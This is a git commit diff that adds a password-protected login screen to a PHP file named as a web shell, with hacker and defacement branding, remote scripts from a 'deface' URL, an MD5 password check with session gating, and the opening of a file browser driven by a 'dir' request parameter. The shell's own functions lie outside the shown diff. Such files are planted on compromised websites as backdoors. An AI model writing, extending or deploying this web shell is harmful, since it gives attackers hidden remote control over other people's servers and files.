6d4678e1db66a10f2eb32ae47fb64ebe6ea309e3
atomicspot <irfanarmansyah354@gmail.com>
2024-11-21 21:58:34 +0700

    Update newshellblackandgreen.php

--- newshellblackandgreen.php
+++ newshellblackandgreen.php
@@ -1,4 +1,353 @@
 <?php
+session_start();
+$password = "351eb72216ba1aa116edb5142d3a810d";
+
+function login_shell()
+{
+?>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>El - Gasci </title>
+<body>
+<style type="text/css">
+h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h4 {color: #FF0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+    text-align : center;
+    }
+.jokitz2{
+    text-align : center;
+    font-family : Courier;
+    }
+</style>
+<script type="text/javascript">
+ 
+<!--
+ 
+//Disable right click script
+ 
+ 
+var message="Dear Admin, Just Edit Index";
+ 
+///////////////////////////////////
+ 
+function clickIE() {if (document.all) {(message);return false;}}
+ 
+function clickNS(e) {if
+ 
+(document.layers||(document.getElementById&&!document.all)) {
+ 
+if (e.which==2||e.which==3) {(message);return false;}}}
+ 
+if (document.layers)
+ 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+ 
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+ 
+document.oncontextmenu=new Function("return false")
+ 
+// -->
+ 
+</script>
+ 
+<!-- <script language="JavaScript1.2" type="text/javascript">
+ 
+function ClearError() {return true;}
+ 
+window.onerror = ClearError;
+ 
+</script> -->
+ 
+ 
+ <script type="application/javascript" language="javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(23-01).js"></script>
+</head>
+<center>
+
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnvcSIYA3-yfsllWXeXa3WrOyIdYqY6TlvrJOPn4HVs1m8gI5duqdLXGR-aGRFWsLNHlaC9nUUyfRhBbYKIKZNQvNJqchvaIhalMzUEC1z3moD81tY1ks3T-RCoFZAzHbAx6Xknso2MgnPuBiV0ntSvZNoON8f0yHUPErsx5ojhXrpNf86BLJrIVkVTlA/s16000/download__19_-removebg-preview%20(1).png" style="padding-bottom: 2rem;">
+ 
+<br>
+<audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/jeremy-flick_anonymous.mp3" autoplay="1" loop="1"></audio>
+<h1 style="padding-bottom: 4rem;">El - Gasci</h1>
+ 
+ 
+<div id="matrix" class="auto-style8">Tell your mama the ghost is here.</div><br>
+<font face="courier new" color="Red" size"10" >Skill Speak Louder Than Words</font>
+ 
+ 
+<center>
+ 
+<hr width="550px" style='color:cyan;'>
+ 
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+ 
+<span style='font: 15px Lucida Handwriting;size:15px;color:cyan;text-shadow: 0px 0px 50px;'><strong>
+<style type="text/css">
+<span style='font: 100px
+
+    body{
+  font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif;
+  margin-top:0px;
+   background-repeat:no-repeat;
+  padding-top:26px;
+ }
+    #myContent, #myContent blink{
+        width:0%px;
+        height:0%px;
+        background:black;
+        color: #00FFFF;
+        font-family:IceLand;
+        font-size:20px;
+    }    
+    blink{
+        display:inline;
+    }
+    </style><br />
+    <script type="text/javascript">
+  var charIndex = -1;
+    var stringLength = 0;
+    var inputText;
+    function writeContent(init){
+     if(init){
+      inputText = document.getElementById('contentToWrite').innerHTML;
+     }
+        if(charIndex==-1){
+            charIndex = 0;
+            stringLength = inputText.length;
+        }
+        var initString = document.getElementById('myContent').innerHTML;
+  initString = initString.replace(/<SPAN.*$/gi,"");
+       
+       var theChar = inputText.charAt(charIndex);
+       var nextFourChars = inputText.substr(charIndex,4);
+       if(nextFourChars=='<br>' || nextFourChars=='<br>'){
+         theChar  = '<br>';
+         charIndex+=3;
+        }
+        initString = initString + theChar + "<span id='blink'>_</SPAN>";
+        document.getElementById('myContent').innerHTML = initString;
+ 
+        charIndex = charIndex/1 +1;
+  if(charIndex%2==1){
+             document.getElementById('blink').style.display='font: 100px';
+        }else{
+             document.getElementById('blink').style.display='inline';
+        }
+               
+        if(charIndex<=stringLength){
+           setTimeout('writeContent(false)',100);
+       }else{
+        blinkSpan();
+       }  
+   }
+       var currentStyle = 'inline';
+   function blinkSpan(){
+    if(currentStyle=='inline'){
+     currentStyle='none';
+    }else{
+     currentStyle='inline';
+    }
+    document.getElementById('blink').style.display = currentStyle;
+    setTimeout('blinkSpan()',9999999);
+   
+   }
+   </script>
+</html>
+<a><font color="maroon"><img src="https://zhyper-shel.info/imgzhyper/hazard.png" width="50" height="50"></font></font></a>
+
+<script type="text/javascript" src="https://cdn.prinsh.com/NathanPrinsley-effect/daun-berguguran.js" /></script>
+<script type="text/javascript">
+snowStorm.snowColor = '#6bd';
+snowStorm.flakesMaxActive = 96;
+snowStorm.useTwinkleEffect = true;
+</script>
+<div class="main-box">
+    <form action="" method="post">
+        <div class="login">
+            <div id="loginBox" class="login-box">
+                <input type="password" name="pass" placeholder="Password" required>
+                <input type="submit" name="submit" value="Touch">
+            </div>
+        </div>
+    </form>
+</div>
+<style>
+    *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+
+    }
+    @property --rot{
+        syntax: '<angle>';
+        inherits: false;
+        initial-value: 0deg;
+    }
+    body{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #000
+    }
+    .main-box{
+        position: relative;
+        width: 450px;
+        height: 200px;
+        background: repeating-conic-gradient(from var(--rot), rgb(255, 0, 0) 0%, rgb(255, 0, 0) 5%, transparent 5%, transparent 40%, rgb(255, 243, 136) 50%   );
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: rotation 4s linear infinite;
+        transition: 0.5s;
+        margin: 10px 10px;
+    }
+
+    @keyframes rotation {
+        0%{
+          --rot: 0deg;
+        }
+        100%{
+            --rot: 360deg;
+        }
+    }
+
+    .main-box::before{
+        content: '';
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        animation: rotation 4s linear infinite;
+        animation-delay: 0.9s;
+    }
+    .main-box::after{
+        content: '';
+        position: absolute;
+        inset: 4px;
+        background: #000000;
+        border-radius: 15px;
+        border: 8px solid #000000;
+    }
+    .login{
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        inset: 60px;
+        flex-direction: column;
+        border-radius: 10px;
+        background: rgb(0, 0, 0);
+        box-shadow: inset 0 10px 20px rgb(19, 19, 19);
+        z-index: 1000;
+        color: rgb(255, 255, 255);
+        overflow: hidden;
+        inset: 40px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+
+
+
+    .login-box, .login-shell-box{
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        gap: 20px;
+        width: 70%;
+        transition: 0.5s;
+    }
+
+
+    .login-box h2, .login-shell-box h2{
+        text-transform: uppercase;
+        font-weight: 600;
+        font-size: 22px;
+        letter-spacing: 0.2em;
+        text-align: center;
+    }
+    .login-box h2 i, .login-shell-box h2 i{
+        color: rgb(212, 2, 2);
+        text-shadow: 0 0 5px #8300fd, 0 0 25px #ff2770;
+    }
+    .login-box input, .login-shell-box input{
+        width: 100%;
+        padding: 10px 20px;
+        outline: none;
+        font: 1em;
+        color: #ffffff;
+        background: rgb(0, 0, 0);
+        border: 2px solid #ffffff3b;
+        border-radius: 30px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-box input::placeholder, .login-shell-box input::placeholder{
+        color: #999;
+    }
+    .login-box input[type="submit"], .login-shell-box input[type="submit"]{
+        background: rgb(0, 0, 0);
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+        transition: 0.5s;
+        color: #fff;
+    }
+    .login-box input[type="submit"]:hover{
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-group{
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .login-group a{
+        color: white;
+        text-decoration: none;
+    }
+    .login-group a:nth-child(2){
+        color: rgb(212, 2, 2);
+        font-weight: 600;
+        cursor: pointer;
+    }
+
+    .login-shell-box{
+        display: none;
+    }
+</style 
+<?php
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+}
+?>
+
+<?php
 // Set directory root menjadi public_html
 $root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;
